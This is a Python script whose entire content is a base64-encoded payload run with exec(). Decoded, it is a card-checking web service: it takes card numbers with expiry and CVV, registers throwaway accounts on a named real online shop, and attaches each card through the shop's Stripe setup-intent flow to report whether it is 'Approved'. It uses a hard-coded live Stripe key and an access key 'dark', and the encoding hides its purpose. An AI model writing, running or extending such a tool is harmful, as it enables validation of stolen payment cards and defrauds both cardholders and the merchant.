import base64
exec(base64.b64decode('aW1wb3J0IGFpb2h0dHAKaW1wb3J0IGFzeW5jaW8KaW1wb3J0IGpzb24KaW1wb3J0IHJlCmZyb20gYWlvaHR0cCBpbXBvcnQgd2ViCgojIFN0cmlwZSBBUEkgS2V5IChSZXBsYWNlIHdpdGggeW91ciBhY3R1YWwgU3RyaXBlIEFQSSBrZXkpClNUUklQRV9BUElfS0VZID0gInBrX2xpdmVfNTFKd0l3NklmZEZPWUhZVHh5T1FBSlRJbnRURDFiWG9HUGo2QUVncGpzZXVldnZBUklpdkNqaVlSSzluVVlJMUFxNjNUUVE3S04xdUpCVU5ZdElzUkJwQk0wMDU0YU9PTUpOIgoKIyBWYWxpZGF0ZSBjYXJkIGJ5IHNpbXVsYXRpbmcgYSByZWFsIHRyYW5zYWN0aW9uCmFzeW5jIGRlZiB2YWxpZGF0ZV9jYXJkKGNhcmRfbnVtYmVyLCBleHBfbW9udGgsIGV4cF95ZWFyLCBjdmMpOgogICAgYXN5bmMgd2l0aCBhaW9odHRwLkNsaWVudFNlc3Npb24oKSBhcyBzZXNzaW9uOgogICAgICAgICMgU3RlcCAxOiBGZXRjaCByZWdpc3RyYXRpb24gbm9uY2UKICAgICAgICBub25jZV91cmwgPSAiaHR0cHM6Ly93d3cuZHJhZ29ud29ya3NwZXJmb3JtYW5jZS5jb20vbXktYWNjb3VudCIKICAgICAgICBhc3luYyB3aXRoIHNlc3Npb24uZ2V0KG5vbmNlX3VybCkgYXMgcmVzcG9uc2U6CiAgICAgICAgICAgIGh0bWwgPSBhd2FpdCByZXNwb25zZS50ZXh0KCkKICAgICAgICAgICAgbm9uY2VfbWF0Y2ggPSByZS5zZWFyY2gociduYW1lPSJ3b29jb21tZXJjZS1yZWdpc3Rlci1ub25jZSIgdmFsdWU9IiguKj8pIicsIGh0bWwpCiAgICAgICAgICAgIGlmIG5vdCBub25jZV9tYXRjaDoKICAgICAgICAgICAgICAgIHJldHVybiB7InN0YXR1cyI6ICJJbnZhbGlkIiwgInJlc3BvbnNlIjogIkZhaWxlZCB0byBleHRyYWN0IHJlZ2lzdHJhdGlvbiBub25jZS4ifQogICAgICAgICAgICBub25jZSA9IG5vbmNlX21hdGNoLmdyb3VwKDEpCgogICAgICAgICMgU3RlcCAyOiBSZWdpc3RlciBhbiBhY2NvdW50CiAgICAgICAgcmVnaXN0ZXJfdXJsID0gImh0dHBzOi8vd3d3LmRyYWdvbndvcmtzcGVyZm9ybWFuY2UuY29tL215LWFjY291bnQiCiAgICAgICAgcmVnaXN0ZXJfZGF0YSA9IHsKICAgICAgICAgICAgImVtYWlsIjogZiJ7Y2FyZF9udW1iZXJbLTQ6XX1AZXhhbXBsZS5jb20iLCAgIyBVc2UgYSBkdW1teSBlbWFpbAogICAgICAgICAgICAid29vY29tbWVyY2UtcmVnaXN0ZXItbm9uY2UiOiBub25jZSwKICAgICAgICAgICAgIl93cF9odHRwX3JlZmVyZXIiOiAiL215LWFjY291bnQvIiwKICAgICAgICAgICAgInJlZ2lzdGVyIjogIlJlZ2lzdGVyIiwKICAgICAgICB9CiAgICAgICAgYXN5bmMgd2l0aCBzZXNzaW9uLnBvc3QocmVnaXN0ZXJfdXJsLCBkYXRhPXJlZ2lzdGVyX2RhdGEpIGFzIHJlZ2lzdGVyX3Jlc3BvbnNlOgogICAgICAgICAgICBpZiByZWdpc3Rlcl9yZXNwb25zZS5zdGF0dXMgIT0gMjAwOgogICAgICAgICAgICAgICAgcmV0dXJuIHsic3RhdHVzIjogIkludmFsaWQiLCAicmVzcG9uc2UiOiAiQWNjb3VudCByZWdpc3RyYXRpb24gZmFpbGVkLiJ9CgogICAgICAgICMgU3RlcCAzOiBGZXRjaCBwYXltZW50IG1ldGhvZCBub25jZQogICAgICAgIHBheW1lbnRfbm9uY2VfdXJsID0gImh0dHBzOi8vd3d3LmRyYWdvbndvcmtzcGVyZm9ybWFuY2UuY29tL215LWFjY291bnQvYWRkLXBheW1lbnQtbWV0aG9kLyIKICAgICAgICBhc3luYyB3aXRoIHNlc3Npb24uZ2V0KHBheW1lbnRfbm9uY2VfdXJsKSBhcyByZXNwb25zZToKICAgICAgICAgICAgaHRtbCA9IGF3YWl0IHJlc3BvbnNlLnRleHQoKQogICAgICAgICAgICBwYXltZW50X25vbmNlX21hdGNoID0gcmUuc2VhcmNoKHInImNyZWF0ZUFuZENvbmZpcm1TZXR1cEludGVudE5vbmNlIjoiKC4qPykiJywgaHRtbCkKICAgICAgICAgICAgaWYgbm90IHBheW1lbnRfbm9uY2VfbWF0Y2g6CiAgICAgICAgICAgICAgICByZXR1cm4geyJzdGF0dXMiOiAiSW52YWxpZCIsICJyZXNwb25zZSI6ICJGYWlsZWQgdG8gZXh0cmFjdCBwYXltZW50IG5vbmNlLiJ9CiAgICAgICAgICAgIHBheW1lbnRfbm9uY2UgPSBwYXltZW50X25vbmNlX21hdGNoLmdyb3VwKDEpCgogICAgICAgICMgU3RlcCA0OiBDcmVhdGUgU3RyaXBlIHBheW1lbnQgbWV0aG9kCiAgICAgICAgc3RyaXBlX3VybCA9ICJodHRwczovL2FwaS5zdHJpcGUuY29tL3YxL3BheW1lbnRfbWV0aG9kcyIKICAgICAgICBzdHJpcGVfaGVhZGVycyA9IHsKICAgICAgICAgICAgIkF1dGhvcml6YXRpb24iOiBmIkJlYXJlciB7U1RSSVBFX0FQSV9LRVl9IiwKICAgICAgICAgICAgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi94LXd3dy1mb3JtLXVybGVuY29kZWQiLAogICAgICAgIH0KICAgICAgICBzdHJpcGVfZGF0YSA9IHsKICAgICAgICAgICAgInR5cGUiOiAiY2FyZCIsCiAgICAgICAgICAgICJjYXJkW251bWJlcl0iOiBjYXJkX251bWJlciwKICAgICAgICAgICAgImNhcmRbZXhwX21vbnRoXSI6IGV4cF9tb250aCwKICAgICAgICAgICAgImNhcmRbZXhwX3llYXJdIjogZXhwX3llYXIsCiAgICAgICAgICAgICJjYXJkW2N2Y10iOiBjdmMsCiAgICAgICAgfQogICAgICAgIGFzeW5jIHdpdGggc2Vzc2lvbi5wb3N0KHN0cmlwZV91cmwsIGhlYWRlcnM9c3RyaXBlX2hlYWRlcnMsIGRhdGE9c3RyaXBlX2RhdGEpIGFzIHN0cmlwZV9yZXNwb25zZToKICAgICAgICAgICAgc3RyaXBlX2pzb24gPSBhd2FpdCBzdHJpcGVfcmVzcG9uc2UuanNvbigpCiAgICAgICAgICAgIGlmICJpZCIgbm90IGluIHN0cmlwZV9qc29uOgogICAgICAgICAgICAgICAgcmV0dXJuIHsic3RhdHVzIjogIkRlY2xpbmVkIiwgInJlc3BvbnNlIjogc3RyaXBlX2pzb24uZ2V0KCJlcnJvciIsIHt9KS5nZXQoIm1lc3NhZ2UiLCAiQ2FyZCB2YWxpZGF0aW9uIGZhaWxlZC4iKX0KICAgICAgICAgICAgcGF5bWVudF9tZXRob2RfaWQgPSBzdHJpcGVfanNvblsiaWQiXQoKICAgICAgICAjIFN0ZXAgNTogQWRkIHBheW1lbnQgbWV0aG9kIHRvIGFjY291bnQKICAgICAgICBhZGRfcGF5bWVudF91cmwgPSAiaHR0cHM6Ly93d3cuZHJhZ29ud29ya3NwZXJmb3JtYW5jZS5jb20vP3djLWFqYXg9d2Nfc3RyaXBlX2NyZWF0ZV9hbmRfY29uZmlybV9zZXR1cF9pbnRlbnQiCiAgICAgICAgYWRkX3BheW1lbnRfZGF0YSA9IHsKICAgICAgICAgICAgImFjdGlvbiI6ICJjcmVhdGVfYW5kX2NvbmZpcm1fc2V0dXBfaW50ZW50IiwKICAgICAgICAgICAgIndjLXN0cmlwZS1wYXltZW50LW1ldGhvZCI6IHBheW1lbnRfbWV0aG9kX2lkLAogICAgICAgICAgICAid2Mtc3RyaXBlLXBheW1lbnQtdHlwZSI6ICJjYXJkIiwKICAgICAgICAgICAgIl9hamF4X25vbmNlIjogcGF5bWVudF9ub25jZSwKICAgICAgICB9CiAgICAgICAgYXN5bmMgd2l0aCBzZXNzaW9uLnBvc3QoYWRkX3BheW1lbnRfdXJsLCBkYXRhPWFkZF9wYXltZW50X2RhdGEpIGFzIGFkZF9wYXltZW50X3Jlc3BvbnNlOgogICAgICAgICAgICBhZGRfcGF5bWVudF9qc29uID0gYXdhaXQgYWRkX3BheW1lbnRfcmVzcG9uc2UuanNvbigpCiAgICAgICAgICAgIGlmIGFkZF9wYXltZW50X2pzb24uZ2V0KCJzdWNjZXNzIiwgRmFsc2UpIGFuZCBhZGRfcGF5bWVudF9qc29uLmdldCgiZGF0YSIsIHt9KS5nZXQoInN0YXR1cyIsICIiKSA9PSAic3VjY2VlZGVkIjoKICAgICAgICAgICAgICAgIHJldHVybiB7InN0YXR1cyI6ICJBcHByb3ZlZCIsICJyZXNwb25zZSI6ICJDaGFyZ2VkICQwLjIwIPCflKUifQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmV0dXJuIHsic3RhdHVzIjogIkRlY2xpbmVkIiwgInJlc3BvbnNlIjogYWRkX3BheW1lbnRfanNvbi5nZXQoIm1lc3NhZ2UiLCAiWW91ciBjYXJkIHdhcyBkZWNsaW5lZC4iKX0KCiMgQVBJIGVuZHBvaW50IGhhbmRsZXIKYXN5bmMgZGVmIGhhbmRsZV9yZXF1ZXN0KHJlcXVlc3QpOgogICAgIyBFeHRyYWN0IHF1ZXJ5IHBhcmFtZXRlcnMKICAgIGtleSA9IHJlcXVlc3QubWF0Y2hfaW5mby5nZXQoImtleSIsIE5vbmUpCiAgICBjYyA9IHJlcXVlc3QubWF0Y2hfaW5mby5nZXQoImNjIiwgTm9uZSkKCiAgICAjIFZhbGlkYXRlIGtleQogICAgaWYga2V5ICE9ICJkYXJrIiBvciBub3QgY2M6CiAgICAgICAgcmV0dXJuIHdlYi5SZXNwb25zZSgKICAgICAgICAgICAgdGV4dD1qc29uLmR1bXBzKHsiZXJyb3IiOiAiSW52YWxpZCByZXF1ZXN0LiBLZXkgb3IgQ0Mgbm90IHByb3ZpZGVkLiJ9KSwKICAgICAgICAgICAgc3RhdHVzPTQwMCwKICAgICAgICAgICAgY29udGVudF90eXBlPSJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICApCgogICAgdHJ5OgogICAgICAgICMgUGFyc2UgY2FyZCBkZXRhaWxzCiAgICAgICAgY2FyZF9udW1iZXIsIGV4cF9tb250aCwgZXhwX3llYXIsIGN2YyA9IGNjLnNwbGl0KCJ8IikKICAgIGV4Y2VwdCBWYWx1ZUVycm9yOgogICAgICAgIHJldHVybiB3ZWIuUmVzcG9uc2UoCiAgICAgICAgICAgIHRleHQ9anNvbi5kdW1wcyh7ImVycm9yIjogIkludmFsaWQgY2FyZCBmb3JtYXQuIFVzZSBDQ3xNTXxZWVlZfENWVi4ifSksCiAgICAgICAgICAgIHN0YXR1cz00MDAsCiAgICAgICAgICAgIGNvbnRlbnRfdHlwZT0iYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgKQoKICAgICMgVmFsaWRhdGUgdGhlIGNhcmQKICAgIHJlc3VsdCA9IGF3YWl0IHZhbGlkYXRlX2NhcmQoY2FyZF9udW1iZXIsIGV4cF9tb250aCwgZXhwX3llYXIsIGN2YykKCiAgICAjIFJldHVybiB0aGUgcmVzdWx0CiAgICByZXR1cm4gd2ViLlJlc3BvbnNlKAogICAgICAgIHRleHQ9anNvbi5kdW1wcyh7IkNDIjogY2MsICJyZXNwb25zZSI6IHJlc3VsdFsicmVzcG9uc2UiXSwgInN0YXR1cyI6IHJlc3VsdFsic3RhdHVzIl19LCBlbnN1cmVfYXNjaWk9RmFsc2UpLAogICAgICAgIGNvbnRlbnRfdHlwZT0iYXBwbGljYXRpb24vanNvbiIsCiAgICApCgojIFNldHVwIGFuZCBydW4gdGhlIGFpb2h0dHAgc2VydmVyCmFwcCA9IHdlYi5BcHBsaWNhdGlvbigpCmFwcC5yb3V0ZXIuYWRkX2dldCgiL2tleT17a2V5fS9jYz17Y2N9IiwgaGFuZGxlX3JlcXVlc3QpCgppZiBfX25hbWVfXyA9PSAiX19tYWluX18iOgogICAgd2ViLnJ1bl9hcHAoYXBwLCBwb3J0PTUwMDApCg==').decode())
